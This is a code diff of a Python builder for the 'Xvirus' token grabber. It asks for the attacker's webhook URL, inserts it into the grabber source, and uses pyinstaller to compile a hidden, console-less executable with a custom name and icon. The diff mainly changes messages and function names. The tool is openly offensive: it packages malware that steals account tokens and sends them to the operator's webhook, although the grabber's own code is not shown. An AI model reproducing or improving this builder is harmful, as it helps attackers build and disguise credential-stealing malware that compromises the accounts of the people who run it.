@@ -3,13 +3,13 @@ import os
 import sys
 import shutil
 from win10toast import ToastNotifier
+from util.plugins.common import *
 
-os.system('title Xvirus-grabber Builder')
-os.system("color b")
-os.system("cls")
+setTitle(f"Token Grabber Builder")
+clear()
 
-def main():
-    webhook = input("[Enter your webhook URL]:> ")
+def grabber_builder():
+    webhook = input("Enter your webhook URL: ")
     global search_text
     global replace_text
     search_text = "WEBHOOK_URL"
@@ -26,26 +26,26 @@ def main():
 
             file.write(data)
 
-        print("[!] Successfully wrote your webhook to the src. Make sure again you entered a correct one!")
+        print("Successfully wrote your webhook to the src. Make sure again you entered a correct one!")
         time.sleep(0.5)
-        print(f"[*] This is the webhook you entered: {webhook}")
+        print(f"This is the webhook you entered: {webhook}")
     except Exception:
         print("[?] Failed to write your webhook to the src. Make sure the code is correct and has not been changed.")
         time.sleep(0.5)
-        print(f"[*] This is the webhook you entered: {webhook}")
+        print(f"This is the webhook you entered: {webhook}")
     global file_name
-    file_name = input("[Enter the name of the executable (File name)]:> ")
+    file_name = input("Enter the name of the executable (File name): ")
     time.sleep(1.5)
 
-    print("[*] Starting to build your stub in 3 seconds...")
+    print("Starting to build your stub in 3 seconds...")
     time.sleep(3.0)
-    print("[!] File compilation started well.")
+    print("File compilation started well.")
     time.sleep(0.5)
-    print("[*] Press CTRL + C to cancel, may break the application for future builds.")
+    print("Press CTRL + C to cancel, may break the application for future builds.")
     time.sleep(1.0)
 
     os.system(f"pyinstaller --noconsole --onefile -n {file_name} -i assets/icons/exe.ico util/xvirus_grabber.py")
-    os.system("cls")
+    clear()
 
     global directory
     global toast
@@ -67,9 +67,9 @@ def main():
     try:
         shutil.rmtree(f"{directory}/build")
         os.remove(f"{file_name}.spec")
-        print(f"[*] Successfully cleaned the folder and removed non-required/temporary files. ({path}, {path2})")
+        print(f"Successfully cleaned the folder and removed non-required/temporary files. ({path}, {path2})")
     except:
-        print(f"[!] Couldn't delete temporary files. They have probably already been deleted.")
+        print(f"Couldn't delete temporary files. They have probably already been deleted.")
 
     time.sleep(1.0)
 
@@ -84,28 +84,27 @@ def main():
 
             file.write(data)
 
-        print("[*] Successfully removed your webhook from the src for future builds.")
+        print("Successfully removed your webhook from the src for future builds.")
         time.sleep(0.5)
     except:
-        print("[!] Failed to remove your webhook from the src. Make sure the code is correct and has not been changed.")
+        print("Failed to remove your webhook from the src. Make sure the code is correct and has not been changed.")
         time.sleep(0.5)
 
     try:
         path = directory + "/output"
         path = os.path.realpath(path)
         os.startfile(path)
-        print(f"[*] Opened the directory where {file_name}.exe is located.")
+        print(f"Opened the directory where {file_name}.exe is located.")
     except:
-        print(f"[!] Couldn't open the directory where {file_name}.exe is located. Maybe is has been deleted or wasn't built correctly. I would still recommend you to check the following directory for {file_name}.exe: '{directory} + {output}'")
+        print(f"Couldn't open the directory where {file_name}.exe is located. Maybe is has been deleted or wasn't built correctly. I would still recommend you to check the following directory for {file_name}.exe: '{directory} + {output}'")
 
     time.sleep(1.0)
 
-    print(f"[*] Done. You can check the following directory, but the folder should have already been opened: [ {os.path.dirname(os.path.realpath(__file__))} ] for '{file_name}.exe'")
+    print(f"Done. You can check the following directory, but the folder should have already been opened: [ {os.path.dirname(os.path.realpath(__file__))} ] for '{file_name}.exe'")
     time.sleep(0.5)
-    print("[!] Exiting in 10 seconds...")
+    print("Exiting in 10 seconds...")
     time.sleep(10)
-    main()
+    __import__("Xvirus").main()
 
 
-if __name__ == "__main__":
-    main()
+grabber_builder()
